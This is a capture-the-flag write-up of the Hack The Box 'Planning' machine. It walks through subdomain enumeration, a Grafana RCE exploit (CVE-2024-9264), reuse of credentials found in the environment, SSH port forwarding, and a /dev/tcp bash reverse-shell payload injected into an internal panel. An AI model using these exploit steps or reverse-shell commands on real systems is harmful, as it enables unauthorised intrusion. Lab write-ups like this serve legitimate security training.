# 🧠 Hack The Box – Planning (Easy)

## 📌 Machine Info
- **Name:** Planning  
- **Difficulty:** Easy  
- **OS:** Linux  
- **IP Address:** 10.10.11.68  
- **Author:** Vishnu S  
- **Completed on:** July 6, 2025

---

## 🔍 Summary

The Planning machine involves:
- Virtual host enumeration  
- Exploiting Grafana (CVE-2024-9264)  
- Docker container escape  
- Privilege escalation via SSH port forwarding and command injection  

![Planning Page](screenshots/planning.png)

---

## 🛠 Tools Used
- `nmap` – Port scanning  
- `ffuf` – Subdomain enumeration  
- `python3` – Exploit execution  
- `netcat` – Reverse shell listener  
- `ssh` – Remote login & port forwarding  
- `linPEAS` – Privilege escalation enumeration  

---

## 🧾 Walkthrough

### 1️⃣ Initial Enumeration

```bash
nmap 10.10.11.68
````

![Nmap Output](screenshots/nmap-scan.png)

---

### 2️⃣ Virtual Host Setup

Modified `/etc/hosts`:

```
10.10.11.68 planning.htb
```

![Host Added](screenshots/added-host.png)

---

### 3️⃣ Subdomain Discovery

Used FFUF to find subdomains:

```bash
ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" \
-w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 100
```

![FFUF Scan](screenshots/fuff-scan.png)
![Host Added Again](screenshots/added-host1.png)

Discovered: `grafana.planning.htb`

---

### 4️⃣ Grafana Login

Visited: `http://grafana.planning.htb`

Used credentials:

```
Username: admin
Password: 0D5oT70Fq13EvB5r
```

![Login Page](screenshots/grafana-login.png)
![Version Info](screenshots/grafana-version.png)

---

### 5️⃣ Exploiting Grafana (CVE-2024-9264)

Started a reverse shell listener:

```bash
nc -lvnp 9001
```

![Listener](screenshots/listener.png)

Ran exploit:

```bash
python3 poc.py --url http://grafana.planning.htb \
--username admin \
--password 0D5oT70Fq13EvB5r \
--reverse-ip 10.10.14.96 \
--reverse-port 9001
```

![Exploit Script](screenshots/python-exploit.png)
![Reverse Shell Access](screenshots/exploited.png)

✅ Reverse shell obtained!

---

### 6️⃣ Docker Escape

Checked environment variables:

```bash
env
```

Found:

```
Username: enzo
Password: RioTecRANDEntANT!
```

![Found Creds](screenshots/found-username-password.png)

SSH login:

```bash
ssh enzo@10.10.11.68
```

![SSH Access](screenshots/ssh.png)

Captured user flag:

```bash
cat /home/enzo/user.txt
```

![User Flag](screenshots/userflag.png)

---

### 7️⃣ Privilege Escalation

Ran linPEAS and discovered crontab entry:

```bash
cat /opt/crontabs/crontab.db
```

Found:

```
Username: root
Password: P4ssw0rdS0pRi0T3c
```

![LinPEAS Output](screenshots/linpeas-crontab.png)
![Root Credentials](screenshots/found-credentials.png)

---

### 8️⃣ Internal Service & Reverse Shell to Root

Discovered local port 8000:

![Local Port](screenshots/port-locally.png)

Port forwarding with SSH:

```bash
ssh -L 8000:localhost:8000 enzo@planning.htb
```

![Port Forwarding](screenshots/port-forwarding.png)

Visited: `http://localhost:8000`

![Visited 8000](screenshots/visited8000.png)

Injected reverse shell payload:

```bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.96/8888 <&1'
```

![Injection](screenshots/injected.png)

Set up listener:

```bash
nc -lvnp 8888
```

![Listener Ready](screenshots/setup-listener.png)

Got root shell! 🎉

![Root Shell](screenshots/gained-rootshell.png)

---

## 🏁 Flags Captured

```bash
cat /home/enzo/user.txt
cat /root/root.txt
```

![User Flag](screenshots/user-flag.png)
![Root Flag](screenshots/root-flagl.png)

---

## ✅ Conclusion

The Planning machine demonstrated a solid exploitation path:

* Default credentials in Grafana
* Environment variable leaks in Docker
* SSH access and internal port forwarding
* Reverse shell injection via internal admin panel

---

## 🔗 References

* [CVE-2024-9264 – Grafana RCE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9264)
* [Exploit PoC by z3k0sec](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)
* [HackTricks Book](https://book.hacktricks.xyz/)
* [Medium Write-up](https://medium.com/@ypopova3/planning-hackthebox-fd3d5fcb8fc7)

